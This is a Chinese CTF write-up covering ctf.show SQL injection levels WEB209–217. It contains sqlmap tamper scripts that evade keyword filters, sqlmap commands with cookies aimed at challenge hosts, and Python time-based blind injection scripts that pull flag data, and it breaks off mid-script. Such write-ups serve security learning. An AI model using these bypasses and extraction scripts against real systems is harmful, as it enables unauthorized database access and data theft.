<h3 id="WEB209"><a href="#WEB209" class="headerlink" title="WEB209"></a>WEB209</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>   <span class="hljs-comment">//TODO 未完工</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ |\*|\=/'</span>, <span class="hljs-variable">$str</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure>

<p>过滤了空格，<code>*，=，空格</code>，空格和*可以使用%0a代替，=可以使用like代替</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br> <br><span class="hljs-string">"""</span><br><span class="hljs-string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span><br><span class="hljs-string">See the file 'LICENSE' for copying permission</span><br><span class="hljs-string">"""</span><br> <br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br> <br>__priority__ = PRIORITY.LOW<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    <span class="hljs-keyword">pass</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    retVal = payload<br> <br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">""</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br> <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<span class="hljs-number">12</span><br>                    <span class="hljs-keyword">continue</span><br> <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'\''</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br> <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'"'</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br> <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'='</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)+<span class="hljs-string">'like'</span>+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br>            <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'*'</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br> <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">" "</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br> <br>            retVal += payload[i]<br> <br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://b99d21e2-6f81-46dd-9ff5-0e9cc844d630.challenge.ctf.show/api/index.php"</span> --dump <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://b99d21e2-6f81-46dd-9ff5-0e9cc844d630.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=ohf9a9h1hfpfj8mu26vpg12j6q"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web209.py<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB210-212"><a href="#WEB210-212" class="headerlink" title="WEB210-212"></a>WEB210-212</h3><figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>($id){<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">strrev(base64_decode(strrev(base64_decode($id))))</span>;<br>  }<br></code></pre></td></tr></tbody></table></figure>

<p>tamper:</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br> <br><span class="hljs-string">"""</span><br><span class="hljs-string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span><br><span class="hljs-string">See the file 'LICENSE' for copying permission</span><br><span class="hljs-string">"""</span><br> <br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    retVal = <span class="hljs-string">""</span><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = base64.b64encode(payload[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">'utf-8'</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">'utf-8'</span>)<br>    <span class="hljs-keyword">return</span> retVal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">""</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'\''</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'"'</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">"*"</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x31</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">"="</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)+<span class="hljs-string">'like'</span>+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">" "</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br> <br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://3adfebe9-ccf3-40bd-b259-ebfd26ffd517.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://3adfebe9-ccf3-40bd-b259-ebfd26ffd517.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=69gp4na9nit752dk1lb5jhi7cq"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web210.py<br></code></pre></td></tr></tbody></table></figure>

<h4 id="WEB211"><a href="#WEB211" class="headerlink" title="WEB211"></a>WEB211</h4><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://ef307896-8ef0-48af-ac70-47667e776942.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://ef307896-8ef0-48af-ac70-47667e776942.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=pbbafdkm6i64e3be1ub9jkccs7"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web210.py -D ctfshow_web --tables<br></code></pre></td></tr></tbody></table></figure>

<h4 id="WEB212"><a href="#WEB212" class="headerlink" title="WEB212"></a>WEB212</h4><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://c39beb64-3b7a-44ea-bdd5-5073158178e8.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://c39beb64-3b7a-44ea-bdd5-5073158178e8.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=k18m6t540ugepgr9map2l5uup4"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web210.py<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB213"><a href="#WEB213" class="headerlink" title="WEB213"></a>WEB213</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://b310bb9b-1ea5-4781-9602-8bae8bf28b13.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://b310bb9b-1ea5-4781-9602-8bae8bf28b13.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=u9raci7ij800josv2o8i2n3cpm"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web210.py<br></code></pre></td></tr></tbody></table></figure>

<p>脚本：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-string">"""</span><br><span class="hljs-string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span><br><span class="hljs-string">See the file 'LICENSE' for copying permission</span><br><span class="hljs-string">"""</span><br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>__priority__ = PRIORITY.LOW<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = retVal.replace(<span class="hljs-string">"-- -"</span>, <span class="hljs-string">"#"</span>)<br>        retVal = retVal.replace(<span class="hljs-string">" "</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">'utf-8'</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">'utf-8'</span>)<br><br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></tbody></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">"http://feced02a-7cae-43a1-ad9c-cc60a4c52c6e.challenge.ctf.show/api/"</span><br><br>result = <span class="hljs-string">""</span><br>i = 0<br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        <span class="hljs-comment"># 查表</span><br>        <span class="hljs-comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><br>        <span class="hljs-comment"># 查字段</span><br>        <span class="hljs-comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span><br>        <span class="hljs-comment"># 查数据</span><br>        payload = <span class="hljs-string">"select flaga from ctfshow_flagx"</span><br>        data = {<br>            <span class="hljs-string">'ip'</span>: f<span class="hljs-string">"if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1)"</span>,<br>            <span class="hljs-string">'debug'</span>: <span class="hljs-string">'0'</span><br>        }<br>        try:<br>            r = requests.post(url, data=data, <span class="hljs-built_in">timeout</span>=1)<br>            <span class="hljs-built_in">tail</span> = mid<br>        except Exception as e:<br>            <span class="hljs-comment"># 如果在1s内没有收到回响，则引发异常，requests.exceptions.Timeout异常，表示请求超时。</span><br>            <span class="hljs-built_in">head</span> = mid + 1<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br>    <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></tbody></table></figure>

<p>超时(查询出的字符大于中位数对应的字符)出现异常，扩大头部，也就是head = mid + 1，未超时则缩小尾部， tail = mid</p>
<h3 id="WEB215"><a href="#WEB215" class="headerlink" title="WEB215"></a>WEB215</h3><p>提示我们闭合</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">"http://eda56622-960c-49f7-9a59-822d8a3dd023.challenge.ctf.show/api/"</span><br><br>result = <span class="hljs-string">""</span><br>i = 0<br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        <span class="hljs-comment"># 查表</span><br>        <span class="hljs-comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><br>        <span class="hljs-comment"># 查字段</span><br>        <span class="hljs-comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span><br>        <span class="hljs-comment"># 查数据</span><br>        payload = <span class="hljs-string">"select flagaa from ctfshow_flagxc"</span><br>        data = {<br>            <span class="hljs-string">'ip'</span>: f<span class="hljs-string">"1'or if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1) #"</span>,<br>            <span class="hljs-string">'debug'</span>: <span class="hljs-string">'0'</span><br>        }<br>        try:<br>            r = requests.post(url, data=data, <span class="hljs-built_in">timeout</span>=1)<br>            <span class="hljs-built_in">tail</span> = mid<br>        except Exception as e:<br>            <span class="hljs-comment"># 如果在1s内没有收到回响，则引发异常，requests.exceptions.Timeout异常，表示请求超时。</span><br>            <span class="hljs-built_in">head</span> = mid + 1<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br>    <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB216"><a href="#WEB216" class="headerlink" title="WEB216"></a>WEB216</h3><p>查询语句：</p>
<figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span> = from_base64($<span class="hljs-built_in">id</span>);<br></code></pre></td></tr></tbody></table></figure>

<p>在SQL中，<code>FROM_BASE64()</code>是一个函数，用于将Base64编码的字符串转换为原始字符串。</p>
<p>Base64是一种将二进制数据编码为可打印ASCII字符的编码方法。它常用于在不可靠的网络环境中传输二进制数据，或者用于将二进制数据嵌入到文本格式中。Base64编码后的字符串由64个字符组成，包括字母（A-Z，a-z）、数字（0-9）和两个特殊字符（+和/），并且通常以等号（=）结尾。</p>
<p><code>FROM_BASE64()</code>函数接受一个Base64编码的字符串作为参数，并返回原始的解码后的字符串。它的一般语法如下：</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">FROM_BASE64</span><span class="hljs-params">(encoded_string)</span></span><br></code></pre></td></tr></tbody></table></figure>

<ul>
<li><code>encoded_string</code> 是一个Base64编码的字符串。</li>
</ul>
<p>PY:</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">"http://0e195a05-4c07-4b7a-bd77-0356fa00be6b.challenge.ctf.show/api/"</span><br>result = <span class="hljs-string">""</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 60):<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        <span class="hljs-comment"># 查数据库</span><br>        <span class="hljs-comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><br>        <span class="hljs-comment"># 查列名字-id.flag</span><br>        <span class="hljs-comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span><br>        <span class="hljs-comment"># 查数据</span><br>        payload = <span class="hljs-string">"select flagaac from ctfshow_flagxcc"</span><br>        data = {<br>            <span class="hljs-string">'ip'</span>: f<span class="hljs-string">"'MQ==') or if (ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1"</span>,<br>            <span class="hljs-string">'debug'</span>:<span class="hljs-string">'0'</span><br>        }<br>        try:<br>            r = requests.post(url, data=data, <span class="hljs-built_in">timeout</span>=1)<br>            <span class="hljs-built_in">tail</span> = mid<br>        except Exception as e:<br>            <span class="hljs-built_in">head</span> = mid + 1<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br>    <span class="hljs-built_in">print</span>(result)<br><br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB217"><a href="#WEB217" class="headerlink" title="WEB217"></a>WEB217</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/sleep/i'</span>,<span class="hljs-variable">$str</span>);<br>    }<br></code></pre></td></tr></tbody></table></figure>

<p>过滤了sleep,可以尝试Benchmark函数</p>
<p><strong>Benchmark</strong></p>
<p>在SQL中，Benchmark函数用于执行重复计算或循环操作，以评估数据库的性能或比较不同查询的执行时间。Benchmark函数的具体语法和行为可能会因数据库管理系统（DBMS）和SQL方言的不同而有所差异。</p>
<p>一般而言，Benchmark函数的语法如下：</p>
<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">BENCHMARK(<span class="hljs-params">iterations</span>, <span class="hljs-params">expression</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<ul>
<li><code>iterations</code> 是一个整数值，表示要执行的循环迭代次数。</li>
<li><code>expression</code> 是在每个循环迭代中要执行的表达式或查询。</li>
</ul>
<p>Benchmark函数将多次执行给定的表达式或查询，并记录执行的总时间或循环次数。它可以帮助开发人员分析和比较不同查询或表达式的性能，并找出潜在的性能瓶颈或优化机会。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span 